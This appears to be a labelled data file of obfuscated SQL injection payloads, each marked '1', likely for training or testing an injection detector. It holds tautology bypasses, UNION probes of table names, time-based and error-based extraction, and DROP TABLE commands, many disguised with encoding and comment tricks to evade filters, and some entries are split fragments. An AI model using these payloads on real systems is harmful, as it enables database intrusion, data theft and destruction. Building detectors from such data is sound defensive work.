"tEST'Or'1'='%31'/*#pti9r3f%33r72b6sm/*%0%61*%2f", 1
"1'/**/OR/**/if(sUbstRInG(DAtabase(),/**/1,/**/1)	=%20'a',/**/SleEp(5),/**/0)/**/--", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users)----navhx5", 1
"%27%20A/*!*/ND%201%3D1%20--%20#ny4vh6wsn6idzm", 1
"test'XOR'1'='1'--/*%0a*/", 1
";SELECTpg_sleep(5);%0a--/*%0a*/", 1
"'U%4eIO%4e", 1
"SELECT%0d%0a1,2,3-%2d%0a", 1
"%27OR%2F%2A%250d%250a%2A%2FEXISTS%28SEL%2545CT%0A1%250aFROMus%2565%2572s%2529--", 1
"'/*!*/ANDextractvalue(1,concat(0x5c,version()))--%0a", 1
"test'XOR%271'%09=%%309'1%27--%0d%0a", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/* # more_noise", 1
"1%u0027%20%20%20%20AND%20%20%20%20substring(database(),%20%20%20%201,%20%20%20%201)%20%20%20%20/**/%u0020=%u0020%u0020%20%20%20%20%u0027s%u0027%20%20%20%20%20%20%20%20OR%20%20%20%20%u0027b%u0027%u0020%u0020=%u0020%u0020%u0027b%u0027--", 1
"1%u0027%u0020oR%u0020iF(sUbsTriNg(DAtabASE(),%u00201,%U00201)=%u0027A%U0027,%U0020SLEEP(5),%u00200)%u0020--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%2F%2A%20AND%20%27a%27%3D%27a%27", 1
"test%2527%2520O%2F%2A%2112345%2A%2FR%2520%25271%2527%253D%25271%2527%2520%2F%2A#edak6znqj", 1
"%%327%20UNION%%320SELECT%20nu%6cl%2C%20null%2C%2%30null%20-%2d%20", 1
"'%20%20&&%20%20extractvalue(1,concat(0x5c,version()))--", 1
"1aNd1=1#yofz6uzwi%0a", 1
"1'/*!*/   OR    ascii(substring(database(),    1,    1))    >    100    --", 1
"%25u0027%25u0020O/*!*/R%25u0020%25u00271%25u0027%3D%25u00271", 1
"%u0027%u0020uN%49On%u0020seLEct%u0020NUll%2c%u0020NUl%6C,%u0020%6eULl%u0020 -- random_noise--%u0020", 1
"'/*!12345*/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/#x1tzoq3rj", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%20OR%20%27b%27%3D%27b%27--", 1
"WAITFORDELAY%0d%0a'0:0:5'--", 1
"'/*!12345*/OR'%31%27=%271%0a", 1
";%u0020SEL%45CT%u0020pg_sleep%285);%u0020-%2d", 1
"' OR 1=1  # more_noise-- #1lw91n5rqzz", 1
"1'/**/ORIF(substring(database(),/*%0a*/1,1)='a',SLEEP(5),0)/*%0a*/--", 1
"ADmiN%27or%250a%271%27%3D%271%2F%2A%250a%2A%2F", 1
";/*!12345*/SELECT/**/%70%67_sleep(5%29;/**/--", 1
";/*!*/ DROP  TABLE  users;  --", 1
"' OR%20EXIS%54S(SELE%43T 1 FROM%20users)--", 1
"'AND%0a1=%201/*!12345*/AND 'a'='a'--", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020/**/--/**/random_noise----vxyv9", 1
"%27%20AND%20extra%63tvalue(1,conca%74(0x5c,%76er%73ion()))--", 1
"test'%20%20%20%20OR%20%20%20%20'1' = '1'%20%20%20%20--%20%20%20%20", 1
"WAITFO/*!12345*/R/**/DELAY/**/%u00270:0:5%u0027--", 1
"1'%09%09%09%09%09OR%09%09%09%09%09IF(substring(database(),%09%09%09%09%091,%09%09%09%09%091)='a',%09%09%09%09%09SLEEP(5),%09%09%09%09%090)%09%09%09%09%09--%0d%0a", 1
"'/**/OR1=1%0d%0a--/*%0a*//*%0a*/--d5am24pqo4", 1
"%U0027%u0020or%u00201=1%U0020--%U0020", 1
"1' && substring(database(), 1, 1) <= 's'  # more_noise--", 1
"%31)/*!*/UNION%20SELE%43T 1,%64atabase(),3 # more_noise--", 1
"1)%20UNIoN%20sEleCT%201,DaTAbasE(),3 Or (1)--", 1
"1)%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%091,database(),3----i9l7f6f3df", 1
"TeST' or '1'='1' --", 1
"1%27/*!12345*/OR/**/IF(substring(database(),/**/1,/**/1)%3D%27a%27,/**/SLEEP(5),/**/0)/**/--", 1
"test%27/*!*/OR%20%271%27%3D%271%27%20/*", 1
"WAITFOR DELAY '0:0:5' # more_noise----f4heprnmxte", 1
"%u0027%u0020aND%u00201=cONvErt(inT,@@VERsION)----xkoqbfse88x1l9", 1
"tEST%27%20OR%20%271%27%3D%271%27%20/*%20--%20random_noise", 1
"1)%20UNiON%20sElECT%201,dAtabase(),3--", 1
";DROP/*%0a*/TABLE%0ausers;/*%0d%0a*/--", 1
"%27/*!*/UNION%20SELECT%20null,%20null,%20null%20--%20", 1
"test'%20%20%20OR%20%20%20'1'%09=/**//**/'1'%20%20%20--%20%20%20", 1
"'/**//**/AND/**//**/extractvalue(1,concat(0x5c,version()))--", 1
"WAITFOR/**/DELAY%20%270:0:5%27%20--%20random_noise--", 1
"%27%20OR%201%3E%3D1%20%20AND%20%27a%27%3D%27a%27--%20", 1
"admi%6e'/**/OR %271'='1", 1
"1%u0027ORascii(substring(database(),1,1))>%0a100--", 1
"admin'/*!*/||(1=1)'1'='1/*%0d%0a*/", 1
";/**/SEL/**/ECT/**/pg_sl%65e%70%285);/**/--", 1
"test' OR '1'IN (1)'1' -- --akquq", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2FIF%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%3D%27a%27%2C%2F%2A%2A%2FSLEEP%285%29%2C%2F%2A%2A%2F0%29%2F%2A%2A%2F--#u0q0kvymagk4ec2", 1
"TEsT' oR '1'='1' --", 1
"1%2527%2520UN%2F%2A%21%2A%2FION%2520SELECT%2520table_name%2C%2520null%2C%2520null%2520FROM%2520information_schema.tables%2520--", 1
"'%20%20%20%20%20AND%20%20%20%20%201%09=	1%20%20%20%20%20--%20%20%20%20%20", 1
"'%41%4eD1%0a=	1%0d%0a%0a--#mkf8ygyvf01", 1
"1 && (1=1)1=1 || (1)", 1
"1%27%2520AND%20substring%2528d%2561taba%2573e%2528%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"; dRop taBLE USErs;  oR 'B'='B'--#f6tsj3snhecx", 1
"'/**/||/**/(1>=1)'1'='1", 1
"1))/**/UNION SELECT 1,database(),3 OR (1)----otjb6ax2", 1
"Test%27%20%7C%7c%20%281%3d1%29%271%27%3d%271%27%20--%20", 1
"1' || ascii(substring(database(), 1, 1)) > 100 ----zffpm3", 1
"' aNd %65xTra%63t%76alUe(1,CONcAt(0X5%63,VerSIO%6E()))--", 1
"' UNION SELECT 1,2,3--#az0e943rtm25f01", 1
"%27%20OR%20%271%27%3D%271#emcZ7p13sOT", 1
"%27%20AnD%20ExTRActVAluE%281%2CcoNCAt%280x5c%2CvERsIoN%28%29%29%29--", 1
"%27%20%55NiON%20SEL%45%43t%201%2c2%2C3--", 1
"%31%29)%20U%4eION%20SE%4cECT%201,database(),3--", 1
"'    Union    sElect    NUll,    Null,    NUll    --", 1
"'UNIONSELECT/*%0d%0a*/null,null,null/*%0a*/--/*%0a*/", 1
"ad%6din'%09%09%0%39%09OR%09%09%09%%309'1'%09%3d  '1", 1
"1'ORascii(substring(database(),1,/*%0a*/1))>/*%0d%0a*/100", 1
"--", 1
";    SELECT    pg_sleep(5);    --", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----7ha5d", 1
"%U0027%U0020And%U0020EXtrActvaluE(1,ConCAt(0x5c,VERSiOn()))--", 1
"1%27%20OR%20ascii(substring%28databas%65%28%29,%201,%201))%20%3E%20%3100%20--", 1
"' OR EXISTS(SELECT 1 FROM users) AND 'a'IN (1)'a'--", 1
"' XOR 1=conVERT(INt,@@VeRsIOn)--", 1
"1)UNIONSELECT", 1
"1,database(),3%20#%20more_noise--", 1
"test' || '1'LIKE'1' /*--ztkann7o", 1
"1%u0027%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020ascii(substring(database(),%u0020%u0020%u0020%u0020%u00201,%u0020%u0020%u0020%u0020%u00201))%u0020%u0020%u0020%u0020%u0020>%u0020%u0020%u0020%u0020%u0020100%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020(1)--", 1
";%20%44ROP%%320TABLE%20users;%%320--", 1
"WAITFO%52 %44%45LAY '0:0:5' AND 'a'='a'--", 1
"'/**/OR 1=1  # more_noise--", 1
"1%27A/**/NDsubstring(database(),/*%0d%0a*/1,1)/*%0a*/%3D%27s%27", 1
"--", 1
"1'/**/OR ascii(substrin%67(datab%61se%28), 1%2c 1)%29 > 100 --", 1
"test'/**/     OR      '1'%09=%20'1'      --      #tb68gnxee2c548", 1
"%u0027AND%0d%0a1>=1%u0020/*!*/AND%u00201=1--%0d%0a", 1
"' UNION SELECT null, null, null -- --zkz8xd49gl", 1
"%27%20A/*!*/ND%201%3D1%20--%20--n50mfo", 1
"' aNd 1>=COnVert(INT,@@VerSIon)--", 1
"%27%20O/*!*/r%%3201%3d1%20%2D-%20", 1
"teSt%27%20or%20%271%27%3D%271%27%20%2F%2A", 1
"1))/**/UNION SELECT 1,%64atab%61%73e(),3%2d- XOR 'a'='a'", 1
"%27OR%0d%0a1%3D1--%0a--ubuek3pq4o7v", 1
"1%27%2F%2A%21%2A%2FOR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20--%20random_noise--", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29%20OR%20%281%29--", 1
";DROPTABLE/*%0a*/users;", 1
"--%0d%0a", 1
"1'%20|| (%31=1)asc%69i(substri%6eg(database(), 1%2c 1)) > 10%30  # more_noise--", 1
"1%27%20%55N%49ON%20%53ELECT%20table_name%2C%2%30%6eull%2C%%320null%20FR/*!*/OM%20infor%6dation_schema.tab%6c%65s%20--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20%20--%20random_noise--", 1
"1) unioN SElECt 1,dAtABAse(),3--#pKW9c296HIUX89q", 1
"'%09oR%091iN%09(1)1%09--%09#YUCK0Q5U7NqH0", 1
"%u0027%u0020AND%u00201=1%u0020 -- random_noise--%u0020", 1
"1))/**/UNION SELECT 1,database(),3 OR (1)--", 1
"%27				OR				EXISTS(SELECT				1				FROM				users)--", 1
"'					UNION					SELECT					null,					null,					null					 OR (1)--", 1
"%u0027%09%09OR%09%091	=%091%09%09--%09%09#2jjgyu", 1
"1 AND%201<=1", 1
"%27OREXIS%54S(%53E%4cECT%%30d%0a1/*%0a*/F%52OMusers)--%0a", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020/**/OR (1)--#7qtdmnfvo1qsm", 1
"test'					OR					'1'%09=%20'1'										--					random_noise--", 1
"1'		UNION		SELECT		table_name,		null,		null		FROM		information_schema.tables		 || (1=1)(1)--", 1
";					dROP					Table					usERS;					--", 1
"1%u0027%U0020%U0020UNIoN%u0020%U0020SElecT%U0020%U0020tabLe_NAMe,%u0020%u0020nULl,%u0020%U0020nULL%u0020%U0020FRoM%U0020%u0020iNForMATIoN_SCHEMa.tAblES%u0020%u0020--", 1
"%u0027%20%20UNIOn%20%20seLECt%20%20nULL,%20%20nulL,%20%20null%20%20--%20%20", 1
";SELEC%54%0d%%30ap%67_sleep(5);--%0a", 1
"test'/**/OR'1'<='1'/*%0a*/--/*%0a*//*%0d%0a*/", 1
"' aNd EXtRACTvaLUE(1,CoNCAt(0X5c,vERsiON()))--", 1
"test'				||				(1	=  1)'1'	=  '1'				/*", 1
"'%20anD%201%20=%09cONvErT(Int,@@vErSIon)--", 1
"%74est'%20%20%20OR%20%20%20'1%27%20=  '1'%20%20%20/*", 1
"' || 1=1 --", 1
"'/**/aNd/**/1<=1/**//**/AND/**/'a'='A'--/**/", 1
"'OR%0d%0a1=1/*!*/AND1=1--/*%0d%0a*/%0d%0a", 1
"1%2F%2A%21%2A%2FAND%201%3D1", 1
"1))					UN/*!12345*/Ion					sElECt					1,dAtaBASe(),3--", 1
"1%u0027%u0020||%u0020(1=1)ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--#laubfjtjefbiw", 1
"1)%u0020UniOn%u0020SelEct%u00201,dATABaSe(),3%u0020OR%u0020%u0027b%u0027=%u0027b%u0027----zhg8wh5nf979d", 1
"%u0027OR1%3D1OR/*%0a*/%u0027b%u0027%3D%u0027b%u0027--%0a", 1
"1' And subSTRInG(DaTabaSe(), 1, 1) = 'S' --", 1
"'/**/AND/**/ExtRAcTvALUe(1,CoNCAt(0x5c,VerSIon()))--", 1
"1%20AND%201%3D1%20OR%20(1)", 1
"1))UNION%0d%0aSELE%43T%20%31,datab%61se(),3--", 1
"%u0027%u0020&&%u0020(1=1)1=1%u0020%u0020anD%u0020%u0027a%u0027=%u0027A%u0027--%u0020", 1
"'/**/AND/**/1	=%091/**/--/**/", 1
"1%27/%2a*/UN/*!*/ION%2f**/SELECT/**/table_na%6d%65,/%2a*/null,/**/nu%6cl/**%2fFROM/**/info%72mation%5fsche%6da.tables/**/--", 1
"test'				OR				'1' =	'1'				/*--tc3d9g7", 1
"1'/**/OR/**/IF(sUBstRINg(DaTaBASE(),/**/1,/**/1)='A',/**/SLeep(5),/**/0)/**/--", 1
"%27%20u%4eIOn%20sELECt%201,2,%33--", 1
"test%u0027%u0020%4fR%u0020%u00271%u0027=%271%u0027%u0020%2d-%u0020", 1
"'		OR		1=%0d%0a1		--		%0a", 1
"'XOR/*%0d%0a*/'1'='1#82iwh%0d%0a", 1
"test%27%20Or%20%271%27%3d%271%27%20%2f%2A--ANK9DvR4D7xgmx", 1
"%27%20AND%201%3D1%20--%20--kvrsrc1cep", 1
"'			or			1%20=	1			--			--1dktma74v9126qt", 1
"1'ANDsubstring(database(),1,/*%0d%0a*/1)%0a='s'--", 1
"1' uNIoN SeleCT TABlE_NaME, NuLl, Null FROm iNFoRMATiOn_schEmA.tAbles --", 1
"tEst' OR '1'IN (1)'1' --", 1
"admin'OR/*%0d%0a*/'1'='1%0a--dtgx1m6y1f878cm", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520%2520%2F%2A%21%2A%2FAND%25201%253D1--", 1
"' aNd eXtRacTValue(1,COnCAt(0X5C,VErsIoN()))--#BWl2RLyp1", 1
"%3b%20drop%20TablE%20users%3b%20--", 1
"admin%27%2F%2A%2A%2FO/*!*/R%2F%2A%2A%2F%271%27%3E%3D%271", 1
"admin'/**/OR/**/'1'='1 # more_noise", 1
";%U0020SELecT%u0020pG_sLEEp(5);%U0020--", 1
"WAITF%4fR%20DELAY%u0020%u00270:0%3a5%u0027--", 1
"'%20%20%20OR%20%20%20EXISTS(SEL/*!*/ECT%20%20%201%20%20%20FROM%20%20%20users) /*!*/AND 1=1--", 1
"tes%74%u0027%09%09%0%39OR%09%09%09%u0027%31%u0027%u0020=%20%u0027%31%u0027%09%09%09--%09%0%39%09", 1
"'OR%2f*%0a*%2f1=1--", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)LIKE'a', SLEEP(5), 0)  /*!*/AND 1=1--", 1
"1%27%20Or%20iF(SUbStRiNg(DataBaSE(),%201,%201)%3D%27a%27,%20SleEp(5),%200)%20--", 1
"1)%20UNION%20SELECT%201,database(),3/**//*!*/AND/**/1=1--", 1
"WAITFOR%20DELAY%20%270:0:5%27----wfgljqex4r", 1
"1)/**/UNION%u0020SELECT%u00201,database(),3 OR 'b'<='b'--", 1
"test%27 OR %271'LIKE'1'  AND 'a'='a'--%20", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),0)/*%0a*/--", 1
"'%20%20A%4eD%20%201	=  1%20%20-%2d%20%20 -- random_noise", 1
"' || '1'<='1 OR 'b'='b'", 1
"1'ORascii(substring(database(),/*%0a*/1,/*%0a*/1))%0d%0a>100 /*!*/AND 1=1--#c41f7eryv0yfll", 1
"1%20AND%201LIKE1--mlb9nzpnsfo", 1
"1%29) UNION SE%4cE%43T%201,database(),3--", 1
"test' OR '1'<='1' -- --1ogdqz2e", 1
"1)) uNion seleCT 1,DAtAbase(),3--", 1
"1))%u0020UNION%u0020SEL%45CT%u00201%2cdatabas%65(),%33--", 1
"'%09%09%09OR%09%09%09'1'%09= '1", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20 -- random_noise--%20--7dn6koayszu455", 1
"%27AND%0a%31=conver%74(int%2c@@version) -- random_noise--", 1
"test'OR%0a'1'IN (1)'1'/*/*%0a*//*!12345*/AND 'a'='a'", 1
"%31%27%20OR%20IF%28substri%6eg(database(),%201%2c%201)%3D%2%37a%27,%20SLEEP(5),%200)%20--#6yzb%75%77%31cse", 1
"test' OR '1'<='1' /* OR (1)#ulspm3i", 1
"'/*!12345*/&&/**/1=convert(int,@@version)--", 1
"1%27ORascii%28substring%28database%28%29%2C1%2C1%29%29%250d%250a%3E100--%2F%2A%250d%250a%2A%2F", 1
"'A%4eD1=%63%6fnvert(int,@@ve%72sion)--/*%0a*/", 1
"%3B%2F%2%41%%32A%2FDROP%20TABLE%20u%73%65rs%3B%20--", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F%2F%2A%2A%2F1%2509%3D%25091%2F%2A%2A%2F%2F%2A%2A%2F--%2F%2A%2A%2F%2F%2A%2A%2F", 1
"1%27%2F%2A%2112345%2A%2FUNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20OR/*%0a*/(1)--/*%0a*/", 1
"1%27/*!12345*/aND SUBsTriNG%28dA%54aBaSE(), 1%2c 1) = 's'%20%2d-", 1
"1'     AND     substring(database(),     1,     1)     	=%20     's'     --", 1
"'Or/*%0d%0a*/'1'='1/*%0a*/", 1
"test' XOR '1'LIKE'1'  /*!*/AND 1=1--", 1
"' Or eXIsTs(seleCT 1 FrOm UseRS)--", 1
"%U0027/*!*/unIOn%20SELeCt%U00201,2,%33-%2D", 1
"1))/**/UNION/**/SEL%45CT/**/%31,da%74abase(),%33--", 1
"1)) U%4eION%20SELECT 1,%64ata%62ase(),3--", 1
"'%20%20%20%20%20XOR%20%20%20%20%201	= 1%20%20%20%20%20%20%20%20%20%20#%20%20%20%20%20more_noise--%20%20%20%20%20#12h9wr68phf6n", 1
"'	anD	1 = 1		#	mORe_NOISe--", 1
"1%29%20UniON%20SeleCT%201%2CdAtABasE%28%29%2c3--", 1
"%27%20A/*!12345*/ND%201%3C%3D1%20--%20", 1
"admin%27%20OR%20%271%27%3D%271#ygombetqi8ug", 1
"test'OR/*%0d%0a*/'1' = '1'%0a--/*%0d%0a*/--q5ecq9cx", 1
"1%%750027%u0020UNI%4fN%%750020SEL/**/ECT%u0020ta%62le_name,%%750020null,%u0020n%75%6cl%u%30020FROM%u0%3020i%6eformation_schema.tab%6ces%u0020--", 1
"1)UN/*!12345*/ION/*%0d%0a*/SELECT", 1
"1,database(),3--/*%0d%0a*/--wihzhfsi8qcpx", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020/*!12345*/-- random_noise--", 1
"%27%20AND%201%3D1%20 OR (1)--%20", 1
"%25u0027%25u0020AND%25u0020extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%23aj8mwjc1zhb4krt", 1
"1)%20UNION%20SELECT%201,database(),3 OR 'b'='b'--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020----zer0p", 1
"1%27%20AND%20%2573ubstr%2569ng%28%2564atabase%28%29%2C%20%2531%2C%201%29%2520%3D%20%27s%27%20--", 1
"%u0027/*%2112%3345*/U%4eI%4fN%u0020SELECT%u00201,2,3--", 1
"%u%30027%u0020OR%u0020%%7500271%%750027%3d%u00271 OR 'b'='b'", 1
"1AND/*%0a*/1=1/*%0a*/", 1
"'/*!12345*/OR '1'='1 -- random_noise", 1
"; SELECT pg_sleep(5); ----1pflav4ot", 1
"1%29)%u0020UnION%u0020SEl%45cT%u00201,dATAbAS%45(),%33--", 1
"'/*!12345*/OR    EXISTS(SELECT    1    FROM    users)--#9l3oxanplnc9vt0", 1
"TeSt'%20OR%20'1'/*!*/=%20'1'%20/*", 1
"1))/**/UNION/**/SELECT/**/1,database(),3----u8psv3hlun42rg", 1
"%27%2F%2A%2112345%2A%2FOR%20%271%27%3D%271", 1
"%u0027%u0020O/*!*/R%u00201=1%u0020--%u0020", 1
";/*!12345*/SELECTpg_sleep(5);%0a/*!*/AND1=1--%0d%0a", 1
";%u%30020%44ROP%u0020%54ABLE%%750020users;%u0020--", 1
"AdMIN%27oR%0A%271%27%3d%271", 1
"", 1
"'/*!*/AND 1=1  # more_noise--", 1
"%27%20XOR%20%271%27%3D%271--of7ijen7ynshvw", 1
";%u0%3020DROP%u002%30TABLE%u0020%75ser%73;%u0020--", 1
"admIN' o%52%20'1'='1 /*!*/AnD 1=1--P1WCoAWG13w64", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 XOR 'b'='b'--", 1
"1)UNIONSELECT1,database(),3--/*%0a*/", 1
"admin' OR '1'='1#veay3269", 1
"' ANd 1=COnverT(iNT,@@veRSiON)--", 1
"1'/*!12345*/UNION%20%20%20%20%20sELECT%20%20%20%20%20table_NAMe,%20%20%20%20%20nULL,%20%20%20%20%20NuLl%20%20%20%20%20froM%20%20%20%20%20iNFORmAtion_sCHema.taBLEs%20%20%20%20%20--", 1
"%27%20OR%20%271%27%3D%271%23lq0ixndzssxws", 1
"admin%27%20OR%20%271%27%3E%3D%271%20OR%20%281%29%234qvn88xyp1v", 1
";%20%20%20DROP%20%20%20TABLE%20%20%20users;%20%20%20%20%20%20--%20%20%20random_noise----hd6ni0h", 1
"'%20%20%20%20%20Or%20%20%20%20%20exisTS(SELeCt%20%20%20%20%201%20%20%20%20%20FRom%20%20%20%20%20UsERs) /*!*/and 1=1----f1OrU", 1
"%27%20anD%20ExTRacTvaLue%281%2CCoNCat%280x5C%2CveRsIoN%28%29%29%29--", 1
"1' aND suBSTrInG(DatAbAsE(), 1, 1) = 's' ----ixly3jkzkqvpk", 1
"%27					%4f/*%2a/R					1%20%3%44%20%2%301					--		%09", 1
"wAiTfoRDeLaY%270:0:5%27--%0d%0a", 1
"; DrOp TA%42L%45 uSe%72s; --", 1
"test'OR'1'='1'", 1
"--", 1
"%3B%252f%2A%21%2A%2F%2544ROP%20TABLE%20user%2573%3B%20%20-%252d%20random_noise%252d-", 1
"1))UNIONSELECT%0a1,database(),3--/*%0d%0a*/", 1
"1)UN/*!12345*/IONSELECT1,database(),3--", 1
"", 1
"'	aNd	1In	(1)ConveRT(iNT,@@versiON)--#U5P03VqHLbdeJ", 1
"%25u0027%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F--%2F%2A%2A%2F", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020 AND 'a'='a'--", 1
"%3B%20DrOp%20taBle%20uSeRs%3B%20--", 1
"1))	UNION	SELECT	1,database(),3--", 1
"1' oR if(SUBSTRiNg(datABasE(), 1, 1)='A', sLeep(5), 0) --", 1
"1%27%20oR%20AsCIi%28SUBStRiNg%28DatAbasE%28%29%2C%201%2c%201%29%29%20%3e%20100%20 -- random_noise--", 1
"1%27%20Or%20If(sUBstrInG(DAtaBAse(),%201,%201)%3D%27A%27,%20slEEp(5),%200)%20--", 1
"adm%69n%u0%3027%u0020OR%u0020%u0%30271%u0027=%u0%3027%31 /*!*/AND 1=1", 1
"%27/*%0a*/OR%0%61'1'	=%20'1/*%0d%0a*/%23d6mfn%66", 1
"' OR 1=1 -- --7j2rfa", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27%20--%20random_noise--", 1
"1%27/**/O/**/R/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**/----s5igrgul1vrlf", 1
"' UniOn SeleCt NULL, nuLl, null -- --y4nm807kze2f", 1
"'/**/%4fR/**/'%31'='1/*!*/AND 'a'='a'", 1
"WAITFORDELAY", 1
"'0:0:5' OR (1)--%0d%0a", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--%23esm8kh9", 1
"' XOR '1'='1 OR (1)", 1
"' UNION SELECT 1,2,3----5z2sis4rlz4", 1
"1' OR if(SubSTRIng(DAtabASe(), 1, 1)='a', Sleep(5), 0) --", 1
"%27uNIonSeLeCtNuLL%2C%2F%2A%250d%250a%2A%2FNull%2CNuLL%250a--%2F%2A%250a%2A%2F", 1
"' AN%44 1%3d1 --", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)IN (1)%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020 /*!*/AND 1=1--", 1
"WAITFO/*!*/R/**/DELAY/**/%u00270:0:5%u0027--", 1
";/*!*/DROP				TABLE				users;				--", 1
"test'%09%09OR%09%09'1' = '1'%09%09/*", 1
";%u0020SELECT%u0020%70g%5fsleep(5);%%75%30020--", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)/**/#/**/more_noise----l1u00", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29%20--%20random_noise--", 1
"%27%20%20%20%20%20%20%20%20AND%20%20%20%20%20%20%20%201%09%3D%20convert%28int%2C%40%40version%29--", 1
"'/*!1%32345*/OR EXISTS(SELEC%54 1 FROM users)%20# mo%72e_%6e%6fise--", 1
"1%29UNIONSElECT1%2CdAtAbAsE%28%29%2C3--%250d%250a", 1
"%3b%20seLecT%20PG_SleEP%285%29%3B%20--", 1
"%31)%29 UNION SELECT 1,database(%29,3%2d-", 1
"'AND", 1
"extrac%74%76alue(1,conca%74(0x5c,version%28)%29)--", 1
"", 1
"1))/**/uNION/**/SELect/**/1,daTABasE(),3--", 1
";%09%09%09SEL/*!*/ECT%09%09%09pg_sleep(5);%09%09%09--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3/**//*!*/AND/**/1%3D1--", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20----il7mbdb", 1
"1' Or aScIi(SUbsTRInG(DatAbAsE(), 1, 1)) > 100  OR 'b'='b'--", 1
"%27%20UNION%20SELECT%201%2C2%2C3%20AND%20%27a%27%3D%27a%27--%23o3zl9u3xqxr0nw", 1
"1))%u0020unIon%u0020SEleCt%u00201,DaTaBASe(),3--", 1
"ADMIn' Or '1'='1 -- random_noise", 1
"%27%20XOr%20ExtrACtvALuE%281%2CcoNCaT%280X5C%2cvErSiON%28%29%29%29--", 1
"test'/**/OR '1%27='1' %2d-%20 /*!*/AND 1=1--k6iy0wre4ghv9", 1
"1%27%20UNiON%20seLecT%20taBlE_namE,%20NUlL,%20NUlL%20FrOm%20INformATiOn_scHEMA.tABLeS%20--", 1
"1%29%29%25u0020UNION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3--", 1
"%3b%20SE%4cECT%20%70g_sleep(5);%20%20AND%20%27a%27%3D%27a%27--", 1
"1)UniOn", 1
"selEct1,DaTaBAse(),3--", 1
"wAiTfor%20dElAY%20%270:0:5%27--", 1
"'/**/UNION/**/S%45%4cECT%20n%75ll,/**/null,/**/null/**/--/**/", 1
"TEsT'/**/OR/**/'1'='1'/**/--/**/--atuwz0ev", 1
"%2527%2520AnD%2520exTRACtvaLue%281%2cCoNcaT%280x5C%2cvErSIOn%28%29%29%29--", 1
"WAITFOR%20DELAY%20%270:0:5%27%20AND%20%27a%27%3D%27a%27--", 1
"WAITFOR%20DELAY%20%270:0:5%27%20--%20random_noise----6rgdbdwd34e5h", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#80z1e", 1
"TesT' OR '1'='1' --", 1
"1/*!12345*/AND  1%20=%201", 1
"1%27%20UNI%4fN%2%30SEL%45CT%20table_name,%20nu%6cl,%20%6eull%%320FROM%%320information_schema.t%61bles%2%30----cwmtg62y", 1
"%2527%2520Or%25201%253D1%2520--%2520", 1
"1%20And%201%3d1", 1
"1'/*!12345*/ORascii(substring(database(),1,1))>%0a100--", 1
"1)%20UNION%20SELECT%201,da%74abase()%2c3-%2d", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3 OR 'b'='b'--", 1
"1%u0027/**/Or/**/ascIi(SuBStrINg(daTABaSE(),/**/1,/**/1))/**/>/**/100/**/--", 1
"1)%20UNION%20SELECT%201,database(),3----yn25t1", 1
";%20SELECT%20pg_sleep(5)%3b%20%2d%2d--srje9h49", 1
"'/**//**/%55NION/**//**/%53ELECT/**//**/null,/**//**/null,/**//**/null/**//**/%2d-%20", 1
"1))%20UNION%20SELECT%201,database(),3--#a4waei", 1
"%27%2520UNION%2520SELECT%25201%2C2%2C3--%23onlcv9v9a79", 1
"%3b%53ELECTpg_sleep(5);--%%30a", 1
"%27%20%20%20or%20%20%20%271%27	%3D%20%271", 1
"'AND%0d%0a1=convert(int,@@version)--#bntqhaja%0d%0a", 1
"1)%20U%4e%49ON%20SELECT 1,database(),3-%2d--gxqic3rnganf", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027----oxkyjfq0p", 1
"1'/**/AnDsubSTRInG(DatABase(),1,1)='s'%0d%0aOr'b'='b'--", 1
